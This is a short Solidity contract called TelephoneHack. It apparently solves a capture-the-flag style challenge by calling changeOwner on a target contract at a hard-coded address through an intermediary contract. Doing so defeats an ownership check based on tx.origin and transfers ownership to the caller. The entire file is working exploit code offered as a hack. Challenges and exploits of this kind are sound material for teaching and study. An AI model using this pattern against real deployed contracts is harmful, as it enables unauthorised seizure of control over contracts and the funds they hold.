// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface ITelephone {
    function owner() external view returns (address);

    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    address constant TELEPHONE_CONTRACT =
        0x0E52D42D1D3D8f37459d2fd865C61ca5087Ebd49;
    ITelephone telephoneContract = ITelephone(TELEPHONE_CONTRACT);

    function changeOwnerHack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
